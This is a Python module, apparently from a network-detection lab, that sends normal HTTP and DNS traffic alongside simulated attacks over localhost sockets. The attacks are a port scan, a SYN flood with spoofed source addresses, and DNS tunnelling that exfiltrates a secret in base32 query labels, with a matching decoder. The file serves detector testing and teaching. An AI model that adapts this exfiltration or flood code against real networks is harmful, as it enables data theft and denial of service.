"""Traffic generator: normal sessions AND classic attacks, over real sockets.

Every scenario moves genuine bytes through genuine localhost sockets.
The VirtualStack narrates the TCP segments alongside (we cannot sniff
loopback without root; see stack.py). The DNS scenarios send real
DNS wire-format queries to a real UDP resolver we run locally.

Attacks implemented:
  * port_scan   - real connect() attempts across many ports (Nmap-style)
  * syn_flood   - crafted SYN segments injected at speed (the raw-socket
                  version needs root; what the analyzer sees is identical)
  * dns_tunnel  - exfiltrate a secret file inside DNS query labels
"""
import asyncio
import base64
import random
import socket
import threading
from . import packets, stack as stack_mod

# Virtual addresses used in the narrated wire packets. The real sockets
# live on 127.0.0.1; the narration uses these so scenarios look realistic.
CLIENT_IP = "10.0.2.15"
SERVER_IP = "10.0.2.10"


# ------------------------------------------------------- local services
class LabServices:
    """A tiny HTTP responder and a real DNS resolver for the lab."""

    def __init__(self, http_port=0, dns_port=0):
        self.http = socket.socket(); self.http.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.http.bind(("127.0.0.1", http_port)); self.http.listen(8)
        self.http_port = self.http.getsockname()[1]
        self.dns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.dns.bind(("127.0.0.1", dns_port))
        self.dns_port = self.dns.getsockname()[1]
        self.tunnel_chunks: list[str] = []   # labels the resolver received
        self._stop = threading.Event()

    def serve_forever(self):
        threading.Thread(target=self._http_loop, daemon=True).start()
        threading.Thread(target=self._dns_loop, daemon=True).start()

    def _http_loop(self):
        self.http.settimeout(0.2)
        while not self._stop.is_set():
            try:
                conn, _ = self.http.accept()
            except socket.timeout:
                continue
            try:
                conn.recv(4096)
                conn.sendall(b"HTTP/1.0 200 OK\r\nContent-Length: 5\r\n\r\nhello")
            finally:
                conn.close()

    def _dns_loop(self):
        self.dns.settimeout(0.2)
        while not self._stop.is_set():
            try:
                data, addr = self.dns.recvfrom(4096)
            except socket.timeout:
                continue
            try:
                q = packets.parse_dns_query(data)
                if q["name"].endswith(".exfil.lab"):
                    self.tunnel_chunks.append(q["labels"][0])
                # Real DNS response header: same id, QR bit set.
                resp = data[:2] + b"\x81\x80" + data[4:]
                self.dns.sendto(resp, addr)
            except Exception:
                pass

    def close(self):
        self._stop.set()
        self.http.close(); self.dns.close()


_next_port = itertools_count = None
def _ephemeral() -> int:
    global _next_port
    if _next_port is None:
        _next_port = random.randint(20000, 30000)
    _next_port += 1
    return _next_port


# --------------------------------------------------------- scenarios
async def normal_web_session(st: stack_mod.VirtualStack, services: LabServices,
                             path="/index.html"):
    """A real HTTP fetch over a real TCP connection, fully narrated."""
    c_port = _ephemeral()
    s = socket.socket()
    s.settimeout(2)
    try:
        s.connect(("127.0.0.1", services.http_port))
    except OSError:
        st.open(CLIENT_IP, c_port, SERVER_IP, 80, success=False)
        return
    key = st.open(CLIENT_IP, c_port, SERVER_IP, 80, success=True)
    request = f"GET {path} HTTP/1.1\r\nHost: lab\r\n\r\n".encode()
    s.sendall(request)
    st.send(key, request, from_client=True)
    await asyncio.sleep(0.02)
    body = s.recv(4096)
    st.send(key, body, from_client=False)
    s.close()
    st.close(key)


async def normal_dns_lookup(st: stack_mod.VirtualStack, services: LabServices,
                            name="www.example.com"):
    """One real DNS query/response over UDP."""
    wire = packets.build_dns_query(name)
    tap_udp(st, wire, services)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)
    try:
        sock.sendto(wire, ("127.0.0.1", services.dns_port))
        resp, _ = sock.recvfrom(4096)
        tap_udp_response(st, resp, services)
    finally:
        sock.close()


def tap_udp(st, wire, services, src=CLIENT_IP, dst=SERVER_IP):
    pkt = packets.parse_packet(packets.build_ipv4(src, dst, 17, packets.build_udp(_ephemeral(), 53, wire)))
    pkt["direction"] = "c>s"
    st.tap(pkt)


def tap_udp_response(st, wire, services):
    pkt = packets.parse_packet(packets.build_ipv4(SERVER_IP, CLIENT_IP, 17, packets.build_udp(53, _ephemeral(), wire)))
    pkt["direction"] = "s>c"
    st.tap(pkt)


async def port_scan(st: stack_mod.VirtualStack, services: LabServices,
                    ports: list[int] | None = None):
    """Real connect() attempts across a port range, like nmap -sS (but full
    connects, since SYN-crafting needs root). Open ports answer SYN-ACK,
    closed ones RST - the detector watches the fan-out."""
    ports = ports or list(range(1, 101))
    real_open = {services.http_port, services.dns_port}
    for port in ports:
        c_port = _ephemeral()
        s = socket.socket(); s.settimeout(0.05)
        try:
            ok = s.connect_ex(("127.0.0.1", port)) == 0
        finally:
            s.close()
        st.open(CLIENT_IP, c_port, SERVER_IP, port, success=ok or port in real_open)
        await asyncio.sleep(0.002)


async def syn_flood(st: stack_mod.VirtualStack, services: LabServices,
                    target_port=80, count=120, rate_per_s=600):
    """Crafted SYN segments from spoofed addresses, injected as fast as the
    rate allows. On a real interface an attacker sends exactly these bytes
    through a raw socket (root only) - the analyzer cannot tell the difference,
    which is precisely the point of the demo."""
    F = packets.TCP_FLAGS
    for i in range(count):
        fake_ip = f"203.0.113.{random.randint(1, 254)}"   # TEST-NET-3, documentation range
        seg = packets.build_tcp(random.randint(1024, 65000), target_port,
                                random.randint(0, 2**31), 0, F["SYN"])
        wire = packets.build_ipv4(fake_ip, SERVER_IP, 6, seg)
        event = packets.parse_packet(wire)
        event["direction"] = "c>s"
        st.tap(event)
        if i % 20 == 0:
            await asyncio.sleep(20 / rate_per_s)


async def dns_tunnel(st: stack_mod.VirtualStack, services: LabServices,
                     secret: bytes = b"meet at the old bridge at midnight",
                     label_size=44):
    """Exfiltrate `secret` inside DNS query labels to *.exfil.lab.

    Base32 uses only A-Z2-7, which are all legal DNS characters - that is
    exactly why real tunnelling tools use it. The resolver on the other
    side reassembles the labels and recovers the secret.
    """
    encoded = base64.b32encode(secret).decode().rstrip("=").lower()
    for i in range(0, len(encoded), label_size):
        label = encoded[i:i + label_size]
        wire = packets.build_dns_query(f"{label}.exfil.lab")
        tap_udp(st, wire, services)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        try:
            sock.sendto(wire, ("127.0.0.1", services.dns_port))
            resp, _ = sock.recvfrom(4096)
            tap_udp_response(st, resp, services)
        finally:
            sock.close()
        await asyncio.sleep(0.03)


def decode_tunnel_chunks(chunks: list[str]) -> bytes:
    """Resolver side: join the labels and base32-decode back to the secret."""
    joined = "".join(chunks).upper()
    pad = "=" * ((8 - len(joined) % 8) % 8)
    return base64.b32decode(joined + pad)
